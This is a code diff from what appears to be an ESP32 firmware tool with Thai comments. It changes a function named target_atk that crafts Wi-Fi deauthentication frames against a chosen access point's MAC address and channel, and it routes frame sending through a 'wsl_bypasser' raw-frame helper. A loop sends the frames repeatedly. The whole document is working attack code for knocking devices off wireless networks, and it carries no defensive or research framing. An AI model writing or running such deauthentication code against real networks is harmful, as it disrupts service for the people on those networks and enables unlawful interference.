@@ -745,23 +745,23 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     resetGlobalState();
     cleanlyStopWebUiForWiFiFeature();
 
-    // ใช้ wifi_atk_setWifi() แบบเดิมที่ Deauth Flood ใช้ (APSTA mode)
     if (!wifi_atk_setWifi()) return;
 
-    // ตั้ง channel ให้ตรงกับเป้าหมาย (เหมือนที่ Flood ทำ)
-    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-
-    // สร้าง deauth frame โดยตรง (ไม่ต้องใช้ wsl_bypasser)
+    // สร้าง ap_record ชั่วคราวสำหรับ wsl_bypasser
+    wifi_ap_record_t target_ap;
+    memset(&target_ap, 0, sizeof(target_ap));
+    // แปลง MAC string เป็น bytes
     uint8_t bssid[6];
     sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+    memcpy(target_ap.bssid, bssid, 6);
+    target_ap.primary = channel;
 
+    // ใช้เวทเดียวกับ Deauth Flood เพื่อตั้ง channel และเตรียม frame
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    memcpy(&deauth_frame[4], _default_target, 6);
-    memcpy(&deauth_frame[10], bssid, 6);
-    memcpy(&deauth_frame[16], bssid, 6);
+    wsl_bypasser_send_raw_frame(&target_ap, channel, _default_target);
 
-    // ===== Attack loop (เหมือนเดิม) =====
+    // ===== Attack loop =====
     const uint16_t UPDATE_INTERVAL_MS = 2000;
     const uint8_t FRAMES_PER_SEND = 3;
     uint32_t lastUpdateTime = millis();
@@ -815,7 +815,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
         }
     }
 
-    wifi_atk_unsetWifi();   // คืนค่า WiFi
+    wifi_atk_unsetWifi();
     returnToMenu = true;
 }
 
